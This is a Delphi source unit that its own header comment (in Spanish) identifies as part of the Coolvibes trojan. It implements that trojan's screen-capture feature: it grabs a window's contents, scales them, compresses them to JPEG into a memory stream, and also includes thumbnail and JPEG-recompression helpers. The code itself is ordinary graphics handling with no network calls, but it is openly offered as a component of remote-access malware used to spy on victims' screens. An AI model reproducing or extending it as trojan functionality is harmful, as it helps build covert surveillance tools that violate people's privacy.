{Unit perteneciente al troyano Coolvibes que contiene todas las funciones
que son usadas en la captura de pantalla}
unit unitCapScreen;

interface

uses
  Windows,
  SysUtils,
  Graphics,
  Jpeg,
  Classes,
  lomlib,
  UnitVariables,
  UnitFunciones;

procedure Pantallazo(NivelCompresion, width, height : integer; const AHandle: THandle;var MS:Tmemorystream);    //realiza capturas del tamaño deseado
function Comprimir_jpeg(InputFile, OutputFile:AnsiString; quality:integer):boolean;
function GenerateThumb(filename:string;width:integer;height:integer;calidad:integer;var MS:Tmemorystream):boolean;

implementation

function GenerateThumb(filename:string;width:integer;height:integer;calidad:integer;var MS:Tmemorystream):boolean;
var
  Jpg: TjpegImage;
  fBitmap,nbitmap: TBitmap;
  error : boolean;
begin
  Result := false;
   if not fileexists(filename) then
    exit;



  fbitmap:=TBitmap.Create;


  error := false;
  try
    fbitmap.LoadFromFile(filename);
  except
    error := true;     //OPZ! no es un BMP
  end;


  if error then
  begin
      error := false;
      Jpg := TjpegImage.Create;
    try
      Jpg.LoadFromFile(filename);  //Sera un jpeg??
    except
      exit;            //...Adios!
    end;

    fBitmap.Assign(Jpg);    //SI!! es un JPEG
    Jpg.Free;
  end;

  if (not (fBitmap.Width > 1)) or (not (fBitmap.Height > 1)) then
  begin
    exit;            //...Adios!
  end;


  if(Width = 6666666) then  //tamaño relativo, en la variable height tenemos el procentaje
  begin
    Width := (Height*fbitmap.Width) div 100;
    Height := (Height*fbitmap.Height) div 100;
  end
  else
  begin
    Height := (Height*100 div fbitmap.Height); //obtenemos el ratio para no deformar
    Width := (Height*fbitmap.Width) div 100;
    Height := (Height*fbitmap.Height) div 100;
  end;

  
  nBitmap := TBitmap.Create;
  nBitmap.Width := round(fBitmap.Width*(width/fbitmap.Width));
  nBitmap.Height := round(fBitmap.Height*(height/fbitmap.Height));
  nBitmap.PixelFormat := pf32bit;
  fBitmap.PixelFormat := pf32bit;

  SetStretchBltMode(nBitmap.Canvas.Handle, HALFTONE);
  StretchBlt(nBitmap.Canvas.Handle, 0, 0, nBitmap.Width, nBitmap.Height, fBitmap.Canvas.Handle, 0, 0, fBitmap.Width, fBitmap.Height, SRCCOPY);

  fbitmap.free;
  Jpg := TjpegImage.Create;
  Jpg.Assign(nBitmap);
  nbitmap.free;
  Jpg.CompressionQuality := calidad;
  Jpg.Compress;
  Jpg.SaveToStream(MS);  //Guardamos a el TmemoryStream
  jpg.free;
  result := true;
end;


procedure pantallazo(NivelCompresion, width, height : integer; const AHandle: THandle;var MS:Tmemorystream);
var
  Jpg: TjpegImage;
  fBitmap, nBitmap: TBitmap;
  DC: HDC;
  Rect: TRect;
begin

  DC := GetDC(AHandle);

  try
    fBitmap := TBitmap.Create;
    try
      if not GetClientRect(AHandle, Rect) then Exit;

      fBitmap.Width := Rect.Right - Rect.Left;
      fBitmap.Height := Rect.Bottom - Rect.Top;
      fBitmap.PixelFormat := pf32bit;
      BitBlt(fBitmap.Canvas.Handle, 0, 0, fBitmap.Width, fBitmap.Height, DC, 0, 0, SRCCOPY);

      nBitmap := TBitmap.Create;
      nBitmap.Width := round(fBitmap.Width*(Width/anchurapantalla()));
      nBitmap.Height := round(fBitmap.Height*(height/alturapantalla()));
      nBitmap.PixelFormat := pf32bit;
      SetStretchBltMode(nBitmap.Canvas.Handle, HALFTONE);
      StretchBlt(nBitmap.Canvas.Handle, 0, 0, nBitmap.Width, nBitmap.Height, fBitmap.Canvas.Handle, 0, 0, fBitmap.Width, fBitmap.Height, SRCCOPY);


    finally
      fBitmap.Free;
     end;
  finally
    ReleaseDC(AHandle, DC);
  end;
  
  try
    Jpg := TjpegImage.Create;
    Jpg.Assign(nBitmap);
    nBitmap.Free;

    Jpg.CompressionQuality := NivelCompresion;
    Jpg.Compress;
    Jpg.SaveToStream(MS);
 finally
  jpg.free;
 end;
end;

function comprimir_jpeg(InputFile, OutputFile:AnsiString; quality:integer):boolean;
var
  j :TJPegImage;
  Bitmap:TBitmap;
begin
Result := true;
try
j := TJPegImage.Create;
Bitmap := TBitmap.Create;
j.LoadFromFile(InputFile);
Bitmap.Canvas.Draw(0, 0, j);
j.CompressionQuality := quality;
j.Compress;
j.SaveToFile(OutputFile);
//ShowMessage('');
Except on E:Exception do
begin
  Result := false;
  j.free;
  bitmap.Free;
end;
//jpeg.Free;
end;//try-finally
if Result then//no ocurrio ningun error
  j.free;
  bitmap.Free;
begin
end;
end;



end.
